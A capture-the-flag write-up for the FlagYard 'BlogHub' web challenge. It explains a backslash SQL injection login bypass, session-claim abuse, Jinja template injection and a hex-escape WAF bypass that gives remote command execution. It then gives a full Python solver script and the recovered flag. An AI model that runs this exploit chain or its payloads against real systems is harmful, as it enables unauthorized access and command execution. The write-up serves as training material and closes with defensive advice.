# BlogHub

**Challenge Name**: BlogHub
**Category**: Web
**Difficulty**: Medium
**Platform**: FlagYard

## Challenge Overview:
BlogHub is a community blog web application. To retrieve the flag we chain a
backslash-based login SQL injection, a Flask session reflection (the session
stores the raw value we posted), an authorization bypass that unlocks an
admin-only "Create Blog" page, a Jinja Server-Side Template Injection (SSTI)
sink, and a WAF bypass that turns the SSTI into Remote Code Execution (RCE).
The flag is read from the process environment (`DYN_FLAG`). Unlike
NOSJ-style per-connection jails, this is one persistent instance — the state
(and the flag) is fixed for the whole environment run.

### Steps Involved:

1. **Enumeration**:
   - Anonymous `GET /` and `GET /login` redirect to `/blog` (the feed).
   - `/register` creates normal users. Login sends `username` + `password`
     to `POST /login`.

2. **Login SQLi (backslash break-out)**:
   - Post `username=\` (a single backslash) with
     `password= OR 1=1 ORDER BY id LIMIT 1#`.
   - MySQL treats `\` as an escape inside a single-quoted string, so the
     trailing backslash escapes the closing quote of the username value. The
     `AND password='...'` part is then consumed inside the username string and
     the *password* field becomes injected SQL.
   - `OR 1=1 ORDER BY id LIMIT 1` pins the result to the first row — the
     seeded admin (`user_id=1`, `is_admin=true`, random username).

3. **Session Reflection**:
   - The returned session cookie serializes
     `{"is_admin":true,"logged_in":true,"user_id":1,"username":"\"}` — the
     username is the *raw value we posted*, not the DB admin username.
   - `GET /admin` additionally requires `session.username == admin.username`
     (recoverable via a boolean blind SQLi on the username column), so it
     rejects us. Not needed: the **Create Blog** nav entry in `/blog`
     renders on `is_admin:true` alone.

4. **SSTI (Create Blog)**:
   - `POST /home` with `body={{7*7}}` renders `49` in the `/blog` feed,
     confirming `render_template_string` on unsanitized input.

5. **WAF Bypass**:
   - Filtered tokens (POST → 200): `_`, `__init__`, `.popen(`, `.read(`.
   - Jinja's `attr()` filter accepts string names, so blocked identifiers are
     rebuilt from hex escapes the WAF never sees:
     `attr("\x5f\x5finit\x5f\x5f")` → `__init__`,
     `attr("\x70open")` → `popen`, `attr("\x72ead")` → `read`.

6. **RCE → Flag**:
   - `{{cycler|attr("\x5f\x5finit\x5f\x5f")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("os")|attr("\x70open")("env")|attr("\x72ead")()}}`
     executes `env` and renders the output into the feed:
   - `DYN_FLAG=FlagY{d7e0d61a9d8c729ef52e5278d1c9f264}` (the file
     `/app/flag.txt` holds the same 40-byte value; the WAF also blocks the
     literal token `flag`, so direct file reads need glob tricks like
     `cat /app/fla[g].txt`).

### Key Endpoints:
- `POST /login`: Backslash-based SQLi auth bypass → admin session.
- `GET /blog`: Public feed where payload output lands.
- `GET /home` / `POST /home`: Admin Create Blog — the SSTI sink.
- `GET /admin`: Extra admin gate (needs the real admin username) — not
  required for the flag path.

### Techniques Used:
- **Backslash-based Login SQLi**: MySQL escape break-out + `OR 1=1#`.
- **Flask session reflection**: Session claims store the raw posted username.
- **Authorization bypass via session claims**: `is_admin:true` unlocks the
  admin-only UI.
- **Server-Side Template Injection (SSTI)**: `render_template_string` (Jinja2).
- **WAF bypass**: Hex escapes + `attr()` attribute traversal (no `_`, no
  `.popen(`, no `.read(` in the request).
- **RCE via `os.popen`**: Environment leak (`DYN_FLAG`).

### Tools & Libraries:
- **Python 3**: `http.client` only (no external dependencies), raw
  Cookie/session handling.
- **Jinja2**: `cycler`, `attr()`, `__globals__` gadget knowledge.

## Code
**Here it is an automated script that does all the work for you by me :)**
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BlogHub (FlagYard Training Labs) — automated solver.

Chain:
    Username enumeration
      -> backslash-based login SQLi  (username='\' breaks the quote escaping)
      -> session reflection          (raw posted username lands in the session)
      -> authorization bypass        (ORDER BY id LIMIT 1 => seeded admin row, is_admin=true)
      -> SSTI (render_template_string) in /home ("Create Blog", admin nav)
      -> WAF bypass                  (hex escapes + attr() to rebuild blocked names)
      -> RCE via os.popen            -> env -> DYN_FLAG -> flag

Usage:
    python solve_bloghub.py
    python solve_bloghub.py http://<target>.flagyard.com
"""
import sys, os, re, time, base64, zlib, http.client, urllib.parse
from pathlib import Path

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

BANNER = (
    "\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n"
    "\u2551                 B L O G H U B      S O L V E R                    \u2551\n"
    "\u2551   login SQLi -> session authz -> SSTI -> WAF bypass -> RCE        \u2551\n"
    "\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255b"
)

HAMMER = '{{cycler|attr("\\x5f\\x5finit\\x5f\\x5f")|attr("\\x5f\\x5fglobals\\x5f\\x5f")|attr("\\x5f\\x5fgetitem\\x5f\\x5f")("os")|attr("\\x70open")("{cmd}")|attr("\\x72ead")()}}'


def ask_target(argv):
    if len(argv) > 1 and argv[1].startswith('http'):
        return argv[1].strip()
    url = input("Enter the BlogHub challenge URL: ").strip()
    if not url:
        sys.exit("[!] no URL provided")
    return url


def parse_host(url):
    url = re.sub(r'^https?://', '', url).rstrip('/')
    if url.startswith('//'):
        url = url[2:]
    return url


def http_raw(host, path, method='GET', body=None, cookie=None, ctype='application/x-www-form-urlencoded'):
    c = http.client.HTTPConnection(host, 80, timeout=25)
    headers = {'User-Agent': 'Mozilla/5.0'}
    if body is not None:
        headers['Content-Type'] = ctype
        headers['Content-Length'] = str(len(body))
    if cookie:
        headers['Cookie'] = cookie
    c.request(method, path, body=body, headers=headers)
    r = c.getresponse()
    data = r.read().decode('utf-8', 'replace')
    hdrs = dict((k.lower(), v) for k, v in r.getheaders())
    c.close()
    return r.status, data, hdrs


def admin_session(host):
    data = urllib.parse.urlencode({'username': '\\', 'password': ' OR 1=1 ORDER BY id LIMIT 1#'})
    for _ in range(5):
        st, b, h = http_raw(host, '/login', method='POST', body=data)
        m = re.search(r'session=([^;]+)', h.get('set-cookie', ''))
        if m:
            return 'session=%s' % m.group(1)
        time.sleep(4)
    raise RuntimeError('login SQLi failed')


def run(payload_cmd, host, ck):
    body = HAMMER.format(cmd=payload_cmd)
    st, b, h = http_raw(host, '/home', method='POST', body=urllib.parse.urlencode({'title': 'solv', 'body': body}), cookie=ck)
    if st != 302:
        return None
    st, b, h = http_raw(host, '/blog', cookie=ck)
    m = re.search(r'FlagY\{[^}]+\}', b)
    return m.group(0) if m else None


def solve(host):
    print('[*] target host : %s' % host)
    ck = admin_session(host)
    print('[*] admin session acquired (login SQLi): %s...' % ck[:46])
    for cmd in ['env', 'cat /app/fla[g].txt', 'cat /app/fl[a]g.txt', 'cat /app/*.txt', 'ls -la /app']:
        print('[*] SSTI RCE command: %s' % cmd)
        flag = run(cmd, host, ck)
        if flag:
            return flag
        time.sleep(3)
    raise RuntimeError('flag not found')


def main():
    print(BANNER)
    url = ask_target(sys.argv)
    host = parse_host(url)
    print('[*] challenge URL : %s' % url)
    flag = solve(host)
    out = Path(__file__).resolve().parent / 'flag_from_bloghub.txt'
    with open(out, 'w', encoding='utf-8') as f:
        f.write(flag + '\n')
    print('\n' + '        \u2605\u2605\u2605  F L A G   R E C O V E R E D  \u2605\u2605\u2605\n')
    print('        %s' % flag)
    print('\n[+] saved %s' % out)
    print('\n-- Writeup by Fares Badaj -- @ptok3')


if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        print('[!] error: %s' % e)
        sys.exit(1)
```

### Conclusion:
BlogHub is a clean multi-stage web chain: one carefully placed backslash turns
the login into a SQL injection, a session that records your raw input becomes
your admin badge, and a Jinja `render_template_string` sink plus a hex-escape
WAF bypass completes command execution. Defense takeaways: parameterize SQL
queries (including escaping of user-controlled data), never sign
user-influenced data into session *claims*, and treat any
`render_template_string` on client input as RCE-grade.

## Credit

- **Author:** [Fares Badaj](https://www.linkedin.com/in/FaresBadaj) — [@ptok3](https://t.me/ptok3)